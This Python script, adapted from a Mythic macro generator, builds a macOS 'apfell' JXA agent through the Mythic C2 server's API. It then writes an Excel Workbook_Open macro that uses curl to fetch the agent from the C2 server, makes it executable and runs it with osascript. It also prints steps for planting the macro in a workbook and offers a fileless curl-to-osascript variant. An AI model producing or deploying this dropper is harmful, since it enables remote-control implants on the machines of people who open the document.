# Adapted from https://github.com/cedowens/Mythic-Macro-Generator

import shutil, errno, os
from mythic import *
import subprocess
import sys
from Settings.MythicSettings import *


def macro_excel():
    payload = "./Payloads/MacroExcel_Payload"
    #url = mythic_payload_url + "/Excel_Macro.js"   # Used for where the JXA paylaod is hosted

    os.mkdir(payload,0o775) 

    ## Create apfell payload
    async def scripting():
        mythic = mythic_rest.Mythic(
            username=mythic_username,
            password=mythic_password,
            server_ip=mythic_server_ip,
            server_port=mythic_server_port,
            ssl=mythic_ssl,
            global_timeout=-1,
        )
        print("[+] Logging into Mythic")
        await mythic.login()
        await mythic.set_or_create_apitoken()
        # define what our payload should be
        p = mythic_rest.Payload(
            # what payload type is it
            payload_type="apfell", 
            # define non-default c2 profile variables
            c2_profiles={
                "http":[
                        {"name": "callback_host", "value": mythic_http_callback_host},
                        {"name": "callback_interval", "value": mythic_http_callback_interval}
                    ]
                },
            tag="Excel Macro",
            selected_os="macOS",
            # if we want to only include specific commands, put them here:
            #commands=["cmd1", "cmd2", "cmd3"],
            # what do we want the payload to be called
            filename="Excel_Macro.js")
        print("[+] Creating new apfell payload")
        # create the payload and include all commands
        # if we define commands in the payload definition, then remove the all_commands=True piece
        resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)

        payloadDownloadid = resp.response.file["agent_file_id"]
        url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid # modify to point to desired location

        #Download Payload 
        payload_contents = await mythic.download_payload(resp.response)
        pkg_payload = payload + "/Excel_Macro.js"
        with open(pkg_payload, "wb") as f:
            f.write(payload_contents)  # write out to disk


        macrofile = open(payload + '/macro.txt', 'w')
        #macrofile.write('Sub AutoOpen()\n')
        macrofile.write('Sub Workbook_Open()\n')
        macrofile.write("MacScript(\"do shell script \"\"curl -k %s -o excel.js\"\" \")"%url)
        macrofile.write("\n")
        macrofile.write("MacScript(\"do shell script \"\"chmod +x excel.js\"\"\")")
        macrofile.write("\n")
        macrofile.write("MacScript(\"do shell script \"\"osascript excel.js &\"\"\")")
        macrofile.write("\n")
        macrofile.write("End Sub")

        print("Note: \n"
              "1) Copy the macro from Payloads/MacroExcel_Payload/macro.txt to past into Excel Workbook \n"
              "2) When the macro is executed it will save to ~/Library/Containers/com.microsoft.Excel/Data/excel.js\n"
              "3) You could replace command with 'curl -k 'URL' | osascript -l JavaScript &' to avoid disk writes but in testing this hangs the application")



    async def main():
        await scripting()
        try:
            while True:
                pending = mythic_rest.asyncio.all_tasks()
                plist = []
                for p in pending:
                    if p._coro.__name__ != "main" and p._state == "PENDING":
                        plist.append(p)
                if len(plist) == 0:
                    exit(0)
                else:
                    await mythic_rest.asyncio.gather(*plist)
        except KeyboardInterrupt:
            pending = mythic_rest.asyncio.all_tasks()
            for t in pending:
                t.cancel()    

    loop = mythic_rest.asyncio.get_event_loop()
    loop.run_until_complete(main())
